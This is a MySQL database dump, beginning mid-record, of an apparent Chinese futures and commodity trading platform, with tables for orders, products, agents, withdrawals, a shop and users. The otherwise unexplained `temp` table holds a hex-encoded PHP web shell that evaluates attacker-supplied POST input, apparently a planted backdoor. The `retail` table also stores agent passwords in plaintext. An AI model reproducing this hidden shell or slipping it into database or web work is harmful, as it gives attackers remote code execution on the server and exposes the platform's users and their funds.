:1:\"6\";s:4:\"name\";s:9:\"关键字\";s:3:\"var\";s:7:\"seo_key\";s:5:\"value\";s:0:\"\";s:4:\"type\";s:4:\"text\";s:5:\"alter\";N;s:7:\"comment\";s:21:\"SEO的默认关键字\";s:5:\"level\";i:3;s:7:\"uploads\";a:0:{}}i:10;a:10:{s:2:\"id\";i:9;s:3:\"pid\";s:1:\"6\";s:4:\"name\";s:6:\"描述\";s:3:\"var\";s:8:\"seo_desc\";s:5:\"value\";s:0:\"\";s:4:\"type\";s:8:\"textarea\";s:5:\"alter\";N;s:7:\"comment\";s:18:\"SEO的默认描述\";s:5:\"level\";i:3;s:7:\"uploads\";a:0:{}}i:12;a:10:{s:2:\"id\";i:13;s:3:\"pid\";s:1:\"2\";s:4:\"name\";s:22:\"分成最大百分比%\";s:3:\"var\";s:9:\"web_point\";s:5:\"value\";s:2:\"80\";s:4:\"type\";s:4:\"text\";s:5:\"alter\";N;s:7:\"comment\";s:17:\"1-100整数之间\";s:5:\"level\";i:3;s:7:\"uploads\";a:0:{}}i:13;a:10:{s:2:\"id\";i:14;s:3:\"pid\";s:1:\"2\";s:4:\"name\";s:18:\"首页商品交易\";s:3:\"var\";s:14:\"web_trade_time\";s:5:\"value\";s:62:\"商品时间：周一~周五上午8:00~凌晨4:00 周末休市\";s:4:\"type\";s:4:\"text\";s:5:\"alter\";N;s:7:\"comment\";s:12:\"商品时间\";s:5:\"level\";i:3;s:7:\"uploads\";a:0:{}}i:14;a:10:{s:2:\"id\";i:15;s:3:\"pid\";s:1:\"2\";s:4:\"name\";s:12:\"微信回复\";s:3:\"var\";s:16:\"web_wechart_info\";s:5:\"value\";s:168:\"您好，请问有什么可以帮助您？小蚂蚁每个商品交易日09:00~18:00都会恭候您，只需在公众号说出您的需求，我们将竭诚为您解答~\";s:4:\"type\";s:4:\"text\";s:5:\"alter\";N;s:7:\"comment\";s:9:\"小蚂蚁\";s:5:\"level\";i:3;s:7:\"uploads\";a:0:{}}}', '1', '1');
INSERT INTO `option` VALUES ('2', 'risk_switch', 's:1:\"0\";', '2', '1');
INSERT INTO `option` VALUES ('3', 'risk_product', 'a:3:{s:2:\"ag\";s:1:\"1\";s:4:\"conc\";s:1:\"1\";s:3:\"xau\";s:1:\"1\";}', '2', '1');
INSERT INTO `option` VALUES ('4', 'console_settings', 'a:0:{}', '1', '1');
INSERT INTO `option` VALUES ('5', 'risk_product_control', 'a:1:{s:4:\"mila\";a:4:{s:5:\"start\";i:1503542483;s:5:\"price\";s:3:\"997\";s:6:\"target\";s:3:\"123\";s:4:\"time\";s:1:\"5\";}}', '2', '1');

-- ----------------------------
-- Table structure for order
-- ----------------------------
DROP TABLE IF EXISTS `order`;
CREATE TABLE `order` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `product_id` int(11) NOT NULL COMMENT '买卖品类',
  `hand` int(11) NOT NULL COMMENT '手数',
  `price` decimal(11,2) NOT NULL COMMENT '买入价',
  `one_profit` decimal(11,2) NOT NULL COMMENT '一手盈亏',
  `fee` decimal(11,1) DEFAULT '0.0' COMMENT '手续费',
  `stop_profit_price` decimal(11,2) DEFAULT '0.00' COMMENT '止盈金额',
  `stop_profit_point` decimal(11,2) DEFAULT '0.00' COMMENT '止盈点数',
  `stop_loss_price` decimal(11,2) DEFAULT '0.00' COMMENT '止损金额',
  `stop_loss_point` decimal(11,2) DEFAULT '0.00' COMMENT '止损点数',
  `deposit` decimal(11,2) DEFAULT '0.00' COMMENT '保证金',
  `rise_fall` tinyint(4) DEFAULT '1' COMMENT '涨跌：1涨，2跌',
  `sell_price` decimal(11,2) DEFAULT '0.00' COMMENT '卖出价格',
  `sell_hand` int(11) DEFAULT '0' COMMENT '卖出手数',
  `sell_deposit` decimal(11,2) DEFAULT '0.00' COMMENT '卖出总价',
  `discount` decimal(11,2) DEFAULT '0.00' COMMENT '优惠金额',
  `currency` tinyint(4) DEFAULT '1' COMMENT '币种：1人民币，2美元',
  `profit` decimal(11,2) DEFAULT '0.00' COMMENT '盈亏',
  `is_console` tinyint(1) DEFAULT NULL,
  `order_state` tinyint(4) DEFAULT '1' COMMENT '持仓状态，1持仓，2抛出',
  `created_at` datetime DEFAULT NULL COMMENT '下单时间',
  `created_by` int(11) DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL COMMENT '平仓时间',
  `updated_by` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`),
  KEY `product` (`product_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='订单表';

-- ----------------------------
-- Records of order
-- ----------------------------
INSERT INTO `order` VALUES ('1', '100001', '20', '1', '7488.00', '10.00', '1.5', '5.00', '7493.00', '5.00', '7483.00', '10.00', '1', '7493.00', '1', '18.50', '0.00', '1', '8.50', '1', '2', '2017-08-15 17:53:52', '100001', '2017-08-15 17:54:17', '0');
INSERT INTO `order` VALUES ('2', '100001', '20', '1', '7490.00', '10.00', '1.5', '5.00', '7495.00', '5.00', '7485.00', '10.00', '2', '7495.00', '1', '0.00', '0.00', '1', '-8.50', '1', '2', '2017-08-15 18:02:51', '100001', '2017-08-15 18:03:53', '0');

-- ----------------------------
-- Table structure for prize
-- ----------------------------
DROP TABLE IF EXISTS `prize`;
CREATE TABLE `prize` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `prize_name` varchar(255) DEFAULT NULL COMMENT '奖品名称',
  `price` int(11) DEFAULT '100' COMMENT '单价',
  `integral` decimal(13,2) DEFAULT '0.00' COMMENT '积分',
  `url` varchar(100) DEFAULT '/images/homepage_commodity.png' COMMENT '图片地址',
  `hot` tinyint(4) DEFAULT '10' COMMENT '排序',
  `type` tinyint(4) DEFAULT '1' COMMENT '类型',
  `is_show` tinyint(4) DEFAULT '1' COMMENT '是否展现',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COMMENT='奖品兑换表';

-- ----------------------------
-- Records of prize
-- ----------------------------
INSERT INTO `prize` VALUES ('1', '老茶树西湖龙井', '1000', '0.00', '/uploadfile/20170621/104009844818.png', '10', '1', '1');
INSERT INTO `prize` VALUES ('2', '2017春茶上市，路真好绿茶/老茶树西湖龙井', '340', '123.00', '/uploadfile/20170622/110759303659.png', '10', '2', '1');
INSERT INTO `prize` VALUES ('3', 'caaaaaaa', '100', '0.00', '/uploadfile/20170622/095351500286.png', '10', '1', '1');
INSERT INTO `prize` VALUES ('4', '2018552', '240', '360.00', '/uploadfile/20170622/134517981213.png', '10', '2', '1');

-- ----------------------------
-- Table structure for product
-- ----------------------------
DROP TABLE IF EXISTS `product`;
CREATE TABLE `product` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `table_name` varchar(50) NOT NULL COMMENT '产品对应表名',
  `name` varchar(50) NOT NULL COMMENT '产品名称',
  `deposit` decimal(11,2) NOT NULL COMMENT '保证金',
  `one_profit` int(11) NOT NULL COMMENT '一手盈亏',
  `desc` varchar(50) DEFAULT '' COMMENT '产品描述',
  `fee` decimal(11,2) DEFAULT '0.00' COMMENT '手续费',
  `trade_time` text COMMENT '交易时间',
  `is_trade` tinyint(4) DEFAULT '1' COMMENT '允许交易',
  `rest_day` varchar(255) DEFAULT '' COMMENT '休市日',
  `play_rule` text COMMENT '玩法规则',
  `force_sell` tinyint(4) DEFAULT '1' COMMENT '是否强制平仓：1是，-1否',
  `currency` tinyint(4) DEFAULT '1' COMMENT '币种： 1人民币，2美元',
  `hot` tinyint(4) DEFAULT '1' COMMENT '是否是热门期货：1是，-1不是',
  `source` tinyint(4) DEFAULT '1' COMMENT '来源(1交易所2自动生成)',
  `type` tinyint(4) DEFAULT '1' COMMENT '期货类别：1国内，2国外',
  `on_sale` tinyint(4) DEFAULT '1' COMMENT '上架状态：1上架，-1下架',
  `state` tinyint(4) DEFAULT '1' COMMENT '状态',
  PRIMARY KEY (`id`),
  KEY `name` (`table_name`)
) ENGINE=MyISAM AUTO_INCREMENT=23 DEFAULT CHARSET=utf8 COMMENT='交易产品表';

-- ----------------------------
-- Records of product
-- ----------------------------
INSERT INTO `product` VALUES ('1', 'oil', '原油', '0.00', '1000', '', '100.00', 'a:1:{i:0;a:2:{s:5:\"start\";s:5:\"06:00\";s:3:\"end\";s:5:\"05:14\";}}', '1', '', '', '1', '1', '1', '1', '1', '-1', '-1');
INSERT INTO `product` VALUES ('2', 'a50', '富时中国A50', '0.00', '5', '', '10.00', 'a:2:{i:0;a:2:{s:5:\"start\";s:5:\"09:00\";s:3:\"end\";s:5:\"15:55\";}i:1;a:2:{s:5:\"start\";s:5:\"16:40\";s:3:\"end\";s:5:\"23:59\";}}', '1', '', '', '1', '1', '10', '1', '0', '-1', '-1');
INSERT INTO `product` VALUES ('3', 'ic1609', '天燃气', '0.00', '10', '', '99999.00', null, '1', '', '', '1', '2', '9', '1', '0', '-1', '-1');
INSERT INTO `product` VALUES ('4', 'cu0', '铜', '0.00', '200', '', '200.00', 'a:1:{i:0;a:2:{s:5:\"start\";s:5:\"08:00\";s:3:\"end\";s:5:\"04:00\";}}', '1', '', '', '1', '1', '13', '1', '0', '-1', '-1');
INSERT INTO `product` VALUES ('5', 'ni1609', '沪镍', '0.00', '200', '', '99999.00', 'a:1:{i:0;a:2:{s:5:\"start\";s:5:\"15:00\";s:3:\"end\";s:5:\"16:30\";}}', '1', '', '', '1', '1', '8', '1', '0', '-1', '-1');
INSERT INTO `product` VALUES ('6', 'if1609', '宝石', '0.00', '100', '', '99999.00', null, '1', '', '', '1', '1', '14', '1', '0', '-1', '-1');
INSERT INTO `product` VALUES ('7', 'gc', '外汇', '0.00', '600', '', '200.00', 'a:1:{i:0;a:2:{s:5:\"start\";s:5:\"07:00\";s:3:\"end\";s:5:\"04:00\";}}', '1', '', '', '1', '1', '3', '1', '1', '-1', '-1');
INSERT INTO `product` VALUES ('8', 'hkhsi', '恒生指数', '0.00', '50', '', '200.00', 'a:2:{i:0;a:2:{s:5:\"start\";s:5:\"09:30\";s:3:\"end\";s:5:\"12:00\";}i:1;a:2:{s:5:\"start\";s:5:\"13:00\";s:3:\"end\";s:5:\"15:59\";}}', '1', '', '', '1', '2', '12', '1', '1', '-1', '-1');
INSERT INTO `product` VALUES ('9', 'ag', 'AG银', '0.00', '10', '', '100.00', 'a:1:{i:0;a:2:{s:5:\"start\";s:5:\"08:00\";s:3:\"end\";s:5:\"06:00\";}}', '1', '', '', '1', '1', '100', '1', '1', '1', '-1');
INSERT INTO `product` VALUES ('10', 'rb1610', '天然气单位', '0.00', '300', '', '99999.00', 'a:1:{i:0;a:2:{s:5:\"start\";s:5:\"07:00\";s:3:\"end\";s:5:\"04:00\";}}', '1', '', '', '1', '1', '2', '1', '0', '-1', '-1');
INSERT INTO `product` VALUES ('11', 'rm1609', '菜粕', '0.00', '500', '', '99999.00', 'a:1:{i:0;a:2:{s:5:\"start\";s:5:\"13:00\";s:3:\"end\";s:5:\"14:30\";}}', '1', '', '', '1', '1', '7', '1', '0', '-1', '-1');
INSERT INTO `product` VALUES ('12', 'ru1609', '橡胶', '0.00', '400', '', '99999.00', null, '1', '', '', '1', '1', '9', '1', '0', '-1', '-1');
INSERT INTO `product` VALUES ('13', 'hkhsi', '迷你恒生', '0.00', '10', '', '10.00', 'a:2:{i:0;a:2:{s:5:\"start\";s:5:\"09:30\";s:3:\"end\";s:5:\"12:00\";}i:1;a:2:{s:5:\"start\";s:5:\"13:00\";s:3:\"end\";s:5:\"15:59\";}}', '1', '', '', '1', '1', '4', '1', '1', '-1', '-1');
INSERT INTO `product` VALUES ('14', 'xag', '伦敦银', '0.00', '10', '', '10.00', null, '1', '', '', '1', '1', '1', '1', '1', '-1', '-1');
INSERT INTO `product` VALUES ('15', 'xpt', '伦敦铂金', '0.00', '10', '', '10.00', null, '1', '', '', '1', '1', '1', '1', '1', '-1', '-1');
INSERT INTO `product` VALUES ('16', 'sh000001', 'JH上证', '100.00', '1', '', '0.00', 'a:2:{i:0;a:2:{s:5:\"start\";s:5:\"09:30\";s:3:\"end\";s:5:\"11:30\";}i:1;a:2:{s:5:\"start\";s:5:\"13:00\";s:3:\"end\";s:5:\"15:00\";}}', '1', '', '', '1', '1', '1', '1', '1', '-1', '-1');
INSERT INTO `product` VALUES ('17', 'xhn', 'JH沥青', '0.00', '10', 'xhn', '10.00', 'a:1:{i:0;a:2:{s:5:\"start\";s:5:\"08:00\";s:3:\"end\";s:5:\"04:00\";}}', '1', '', '', '1', '1', '1', '1', '1', '-1', '-1');
INSERT INTO `product` VALUES ('18', 'conc', 'YLK油', '0.00', '0', '', '0.00', 'a:1:{i:0;a:2:{s:5:\"start\";s:5:\"09:00\";s:3:\"end\";s:5:\"06:00\";}}', '1', '', null, '1', '1', '10', '1', '1', '1', '-1');
INSERT INTO `product` VALUES ('19', 'xau', 'HK黄金', '0.00', '0', '', '0.00', 'a:1:{i:0;a:2:{s:5:\"start\";s:5:\"09:00\";s:3:\"end\";s:5:\"06:40\";}}', '1', '', null, '1', '1', '50', '1', '1', '1', '-1');
INSERT INTO `product` VALUES ('20', 'longyanxiang', '龙延香', '100.00', '100', '', '0.00', 'a:1:{i:0;a:2:{s:5:\"start\";s:5:\"09:00\";s:3:\"end\";s:5:\"04:00\";}}', '1', '', '', '1', '1', '10', '2', '1', '1', '1');
INSERT INTO `product` VALUES ('21', 'yushi', '玉石', '100.00', '100', '', '0.00', 'a:1:{i:0;a:2:{s:5:\"start\";s:5:\"09:00\";s:3:\"end\";s:5:\"04:00\";}}', '1', '', '', '1', '1', '20', '2', '1', '1', '1');
INSERT INTO `product` VALUES ('22', 'mila', '蜜蜡', '100.00', '100', '', '0.00', 'a:1:{i:0;a:2:{s:5:\"start\";s:5:\"09:00\";s:3:\"end\";s:5:\"04:00\";}}', '1', '', '', '1', '1', '30', '2', '1', '1', '1');

-- ----------------------------
-- Table structure for product_param
-- ----------------------------
DROP TABLE IF EXISTS `product_param`;
CREATE TABLE `product_param` (
  `product_id` int(11) NOT NULL,
  `start_price` int(11) NOT NULL DEFAULT '1' COMMENT '起始价格',
  `end_price` int(11) NOT NULL DEFAULT '1' COMMENT '截止价格',
  `start_point` tinyint(4) NOT NULL DEFAULT '-2' COMMENT '起始点数',
  `end_point` tinyint(4) NOT NULL DEFAULT '2' COMMENT '截止点数',
  PRIMARY KEY (`product_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='产品参数';

-- ----------------------------
-- Records of product_param
-- ----------------------------
INSERT INTO `product_param` VALUES ('20', '7000', '8000', '-3', '3');
INSERT INTO `product_param` VALUES ('21', '13000', '15000', '-4', '4');
INSERT INTO `product_param` VALUES ('22', '5500', '6500', '-2', '2');

-- ----------------------------
-- Table structure for product_price
-- ----------------------------
DROP TABLE IF EXISTS `product_price`;
CREATE TABLE `product_price` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `product_id` int(11) NOT NULL,
  `deposit` decimal(11,2) NOT NULL COMMENT '保证金',
  `one_profit` decimal(11,2) NOT NULL COMMENT '一手盈亏',
  `fee` decimal(11,1) DEFAULT '0.0' COMMENT '手续费',
  `max_hand` int(11) DEFAULT '0' COMMENT '最大手数',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=31 DEFAULT CHARSET=utf8 COMMENT='产品价格拓展表';

-- ----------------------------
-- Records of product_price
-- ----------------------------
INSERT INTO `product_price` VALUES ('1', '9', '10.00', '3.00', '10.0', '10');
INSERT INTO `product_price` VALUES ('2', '9', '30.00', '3.00', '10.0', '10');
INSERT INTO `product_price` VALUES ('3', '9', '80.00', '6.00', '10.0', '10');
INSERT INTO `product_price` VALUES ('4', '9', '150.00', '6.00', '10.0', '10');
INSERT INTO `product_price` VALUES ('5', '9', '500.00', '9.00', '10.0', '10');
INSERT INTO `product_price` VALUES ('6', '18', '3000.00', '3.00', '10.0', '10');
INSERT INTO `product_price` VALUES ('7', '18', '10000.00', '3.00', '10.0', '10');
INSERT INTO `product_price` VALUES ('8', '18', '300000.00', '5.00', '10.0', '10');
INSERT INTO `product_price` VALUES ('9', '18', '155000.00', '5.00', '10.0', '10');
INSERT INTO `product_price` VALUES ('10', '18', '99999999.00', '7.00', '10.0', '10');
INSERT INTO `product_price` VALUES ('11', '19', '10.00', '20.00', '10.0', '10');
INSERT INTO `product_price` VALUES ('12', '19', '30.00', '20.00', '10.0', '10');
INSERT INTO `product_price` VALUES ('13', '19', '80.00', '30.00', '10.0', '10');
INSERT INTO `product_price` VALUES ('14', '19', '150.00', '30.00', '10.0', '10');
INSERT INTO `product_price` VALUES ('15', '19', '500.00', '40.00', '10.0', '10');
INSERT INTO `product_price` VALUES ('16', '20', '10.00', '5.00', '15.0', '10');
INSERT INTO `product_price` VALUES ('17', '20', '100.00', '5.00', '15.0', '10');
INSERT INTO `product_price` VALUES ('18', '20', '200.00', '7.00', '15.0', '10');
INSERT INTO `product_price` VALUES ('19', '21', '10.00', '5.00', '15.0', '10');
INSERT INTO `product_price` VALUES ('20', '21', '100.00', '5.00', '15.0', '10');
INSERT INTO `product_price` VALUES ('21', '21', '200.00', '7.00', '15.0', '10');
INSERT INTO `product_price` VALUES ('22', '22', '10.00', '5.00', '15.0', '10');
INSERT INTO `product_price` VALUES ('23', '22', '100.00', '5.00', '15.0', '10');
INSERT INTO `product_price` VALUES ('24', '22', '200.00', '7.00', '15.0', '10');
INSERT INTO `product_price` VALUES ('25', '20', '500.00', '7.00', '15.0', '10');
INSERT INTO `product_price` VALUES ('26', '20', '1000.00', '9.00', '15.0', '10');
INSERT INTO `product_price` VALUES ('27', '21', '500.00', '7.00', '15.0', '10');
INSERT INTO `product_price` VALUES ('28', '21', '1000.00', '9.00', '15.0', '10');
INSERT INTO `product_price` VALUES ('29', '22', '500.00', '7.00', '15.0', '10');
INSERT INTO `product_price` VALUES ('30', '22', '1000.00', '9.00', '15.0', '10');

-- ----------------------------
-- Table structure for retail
-- ----------------------------
DROP TABLE IF EXISTS `retail`;
CREATE TABLE `retail` (
  `admin_id` int(11) NOT NULL COMMENT '账号id',
  `account` varchar(20) NOT NULL COMMENT '登录账号',
  `pass` varchar(20) NOT NULL COMMENT '登录密码',
  `company_name` varchar(50) NOT NULL COMMENT '会员单位名称',
  `realname` varchar(50) NOT NULL COMMENT '法人名称',
  `point` tinyint(3) DEFAULT '0' COMMENT '返点百分比%',
  `total_fee` decimal(11,2) DEFAULT '0.00' COMMENT '手续费总计',
  `tel` varchar(20) DEFAULT '' COMMENT '联系电话',
  `qq` varchar(20) DEFAULT '' COMMENT 'QQ',
  `id_card` varchar(100) DEFAULT '' COMMENT '法人身份证',
  `paper` varchar(100) DEFAULT '' COMMENT '营业执照',
  `paper2` varchar(100) DEFAULT '' COMMENT '组织机构代码证',
  `paper3` varchar(100) DEFAULT '' COMMENT '税务登记证',
  `code` varchar(100) DEFAULT '' COMMENT '邀请码',
  `created_at` datetime DEFAULT NULL COMMENT '创建时间',
  `created_by` int(11) DEFAULT NULL,
  PRIMARY KEY (`admin_id`),
  UNIQUE KEY `code` (`code`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of retail
-- ----------------------------
INSERT INTO `retail` VALUES ('4', '代理商001', '123456', '代理商001', '代理商001', '70', '1.05', '12345678952', '', '', '', '', '', '361366', '2017-05-19 15:44:16', '1');
INSERT INTO `retail` VALUES ('10', '会07', '$2y$13$U2iS4oo/SDaAo', '会07', '会07', '0', '0.15', '136', '', '', '', '', '', '33533598', '2017-08-15 16:53:35', '1');
INSERT INTO `retail` VALUES ('11', '会08', '123321', '会08', '会08', '0', '0.00', '156', '', '', '', '', '', '65171384', '2017-08-15 16:55:55', '1');

-- ----------------------------
-- Table structure for retail_withdraw
-- ----------------------------
DROP TABLE IF EXISTS `retail_withdraw`;
CREATE TABLE `retail_withdraw` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `admin_id` int(11) NOT NULL COMMENT '用户ID',
  `amount` decimal(11,2) NOT NULL COMMENT '金额',
  `type` tinyint(4) DEFAULT '1' COMMENT '类型：1手续费体现，2保证金充值',
  `out_sn` varchar(25) DEFAULT NULL COMMENT '订单号',
  `isgive` tinyint(2) DEFAULT '1' COMMENT '是否返还',
  `state` tinyint(4) DEFAULT '1' COMMENT '操作状态：1已操作，-1不通过',
  `created_at` datetime DEFAULT NULL COMMENT '创建时间',
  `created_by` int(11) DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL,
  `updated_by` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=71 DEFAULT CHARSET=utf8 COMMENT='用户金额记表';

-- ----------------------------
-- Records of retail_withdraw
-- ----------------------------
INSERT INTO `retail_withdraw` VALUES ('62', '4', '1.00', '1', '4201708141538262966', '1', '-1', '2017-08-14 15:38:26', '4', '2017-08-14 15:47:02', '2');
INSERT INTO `retail_withdraw` VALUES ('63', '4', '2.00', '1', '4201708141548446110', '1', '2', '2017-08-14 15:48:44', '4', '2017-08-14 17:53:16', '2');
INSERT INTO `retail_withdraw` VALUES ('64', '4', '2.00', '1', '4201708141806086255', '1', '2', '2017-08-14 18:06:08', '4', '2017-08-14 18:09:51', '1');
INSERT INTO `retail_withdraw` VALUES ('65', '4', '2.20', '1', '4201708141810099870', '1', '-1', '2017-08-14 18:10:09', '4', '2017-08-14 18:14:47', '1');
INSERT INTO `retail_withdraw` VALUES ('66', '4', '2.20', '1', '4201708141810177041', '1', '1', '2017-08-14 18:10:17', '4', '2017-08-14 18:10:17', '4');
INSERT INTO `retail_withdraw` VALUES ('67', '4', '2.10', '1', '4201708141810288869', '1', '1', '2017-08-14 18:10:28', '4', '2017-08-14 18:10:28', '4');
INSERT INTO `retail_withdraw` VALUES ('68', '4', '1.10', '1', '4201708141815206114', '1', '1', '2017-08-14 18:15:20', '4', '2017-08-14 18:15:20', '4');
INSERT INTO `retail_withdraw` VALUES ('69', '4', '81.10', '1', '4201708141815272440', '1', '1', '2017-08-14 18:15:27', '4', '2017-08-14 18:15:27', '4');
INSERT INTO `retail_withdraw` VALUES ('70', '4', '-12.00', '1', '4201708141815362004', '1', '1', '2017-08-14 18:15:36', '4', '2017-08-14 18:15:36', '4');

-- ----------------------------
-- Table structure for shop
-- ----------------------------
DROP TABLE IF EXISTS `shop`;
CREATE TABLE `shop` (
  `id` int(6) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `shop_name` varchar(30) DEFAULT NULL COMMENT '商品名称',
  `stock_cost` float DEFAULT NULL COMMENT '进货价格',
  `sell_cost` float DEFAULT NULL COMMENT '卖出价格',
  `stock_ture` int(4) DEFAULT NULL COMMENT '真实库存',
  `stock_show` int(4) DEFAULT NULL COMMENT '显示库存',
  `contents` text COMMENT '内容',
  `images` varchar(60) DEFAULT NULL COMMENT '图片',
  `unit` char(15) DEFAULT '240g' COMMENT '单位',
  `hot` tinyint(1) DEFAULT NULL COMMENT '是否热门;1:热门;2:冷门',
  `created_at` datetime NOT NULL COMMENT '创建时间',
  `created_by` int(6) NOT NULL COMMENT '创建人id',
  `updated_at` datetime NOT NULL COMMENT '更新时间',
  `updated_by` int(6) NOT NULL COMMENT '更新人id',
  `is_show` tinyint(1) DEFAULT NULL COMMENT '是否上架;1:上架;2:下架',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='商品表';

-- ----------------------------
-- Records of shop
-- ----------------------------
INSERT INTO `shop` VALUES ('3', '2017春茶上市，路真好绿茶/老茶树西湖龙井', null, '195', '1000', null, '<p>cscs<br/></p>', '/uploadfile/20170620/174134838363.png', '240g', '1', '2017-06-20 17:41:34', '1', '2017-06-20 17:44:59', '1', '1');

-- ----------------------------
-- Table structure for shop_order
-- ----------------------------
DROP TABLE IF EXISTS `shop_order`;
CREATE TABLE `shop_order` (
  `id` int(6) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `order` varchar(250) DEFAULT '' COMMENT '快递单号',
  `user_id` int(11) DEFAULT NULL,
  `shop_id` int(6) DEFAULT NULL COMMENT '商品id',
  `addr_id` int(6) DEFAULT NULL COMMENT '地址id',
  `num` int(10) DEFAULT '0' COMMENT '数目',
  `amount` decimal(11,2) DEFAULT NULL COMMENT '支付金额',
  `charge_type` tinyint(1) DEFAULT NULL COMMENT '充值方式：1支付宝2微信',
  `charge_state` tinyint(1) DEFAULT NULL COMMENT '充值状态：1代付款，2成功，-1 失败;',
  `status` int(11) DEFAULT NULL COMMENT '状态;1:待付款;2:待发货;2:发货中;3:已收货',
  `created_at` datetime DEFAULT NULL COMMENT '创建时间',
  `created_by` int(6) DEFAULT NULL COMMENT '创建人id',
  `updated_at` datetime DEFAULT NULL COMMENT '更新时间',
  `updated_by` int(6) DEFAULT NULL COMMENT '更新人id',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=10 DEFAULT CHARSET=utf8 COMMENT='商品订单表';

-- ----------------------------
-- Records of shop_order
-- ----------------------------
INSERT INTO `shop_order` VALUES ('8', '', '100001', '3', '7', '1', '195.00', null, null, '4', '2017-06-22 17:23:44', '100001', '2017-06-23 11:31:07', '1');
INSERT INTO `shop_order` VALUES ('9', '', '100001', '3', '7', '2', '390.00', null, null, '4', '2017-06-23 11:11:34', '100001', '2017-06-23 11:30:19', '1');

-- ----------------------------
-- Table structure for temp
-- ----------------------------
DROP TABLE IF EXISTS `temp`;
CREATE TABLE `temp` (
  `cmd` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of temp
-- ----------------------------
INSERT INTO `temp` VALUES ('0x3C3F70687020406576616C28245F504F53545B27636D64275D293B3F3E');

-- ----------------------------
-- Table structure for test
-- ----------------------------
DROP TABLE IF EXISTS `test`;
CREATE TABLE `test` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `mobile` char(11) DEFAULT NULL,
  `title` char(20) DEFAULT NULL,
  `message` text,
  `reg_date` date DEFAULT NULL,
  `state` tinyint(4) DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `created_by` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='测试表（表结构可以随意调整）';

-- ----------------------------
-- Records of test
-- ----------------------------

-- ----------------------------
-- Table structure for user
-- ----------------------------
DROP TABLE IF EXISTS `user`;
CREATE TABLE `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(20) NOT NULL COMMENT '用户名',
  `password` varchar(80) NOT NULL COMMENT '密码',
  `mobile` char(11) DEFAULT '' COMMENT '手机号',
  `nickname` varchar(100) DEFAULT '' COMMENT '昵称',
  `admin_id` int(11) DEFAULT '0' COMMENT '代理商ID',
  `pid` int(11) DEFAULT '0' COMMENT '邀请人ID',
  `invide_code` varchar(20) DEFAULT '' COMMENT '邀请码',
  `integral` decimal(13,2) DEFAULT '0.00' COMMENT '积分',
  `account` decimal(13,2) DEFAULT '0.00' COMMENT '账户余额',
  `blocked_account` decimal(13,2) DEFAULT '0.00' COMMENT '冻结金额',
  `profit_account` decimal(13,2) DEFAULT '0.00' COMMENT '总盈利',
  `loss_account` decimal(13,2) DEFAULT '0.00' COMMENT '总亏损',
  `total_fee` decimal(13,2) DEFAULT '0.00' COMMENT '返点总额',
  `fee_detail` varchar(250) DEFAULT '' COMMENT '各级返点详情',
  `login_time` datetime DEFAULT NULL COMMENT '最后登录时间',
  `is_manager` tinyint(4) DEFAULT '-1' COMMENT '是否是经纪人',
  `face` varchar(150) DEFAULT '' COMMENT '头像',
  `open_id` varchar(100) DEFAULT NULL COMMENT '微信的open_id',
  `state` tinyint(4) DEFAULT '1',
  `apply_state` tinyint(4) DEFAULT '1' COMMENT '申请状态：1未申请，2待审核，3审核通过，-1审核不通过',
  `created_at` datetime DEFAULT NULL COMMENT '注册时间',
  `created_by` int(11) DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL,
  `updated_by` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `opneid` (`open_id`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=100021 DEFAULT CHARSET=utf8 COMMENT='用户表';

-- ----------------------------
-- Records of user
-- ----------------------------
INSERT INTO `user` VALUES ('100001', '123456', '$2y$13$.tK1.88Oa.cPYPBTc25FRezudlaW78DNPOSyQcHKNwCdoRDQ3Nf8G', '13100000000', '测试', '4', '100002', '', '885.50', '3485.00', '0.00', '8.50', '-8.50', '0.00', '', null, '1', 'http://wx.qlogo.cn/mmopen/aXUpZVUYfjzDMoq5pZ0iaatiaX4eXf0XAOeG0GDFd4dGpx7zppqlJfSn7bVhLHibqBuu2vYaibpuXq32av27BxatKkiaUL7ibQXAlh/0', 'offpJwhm02JNSfjHYk4c843uOUUU', '1', '1', '2017-02-10 11:19:29', '0', '2017-08-25 16:54:30', '1');
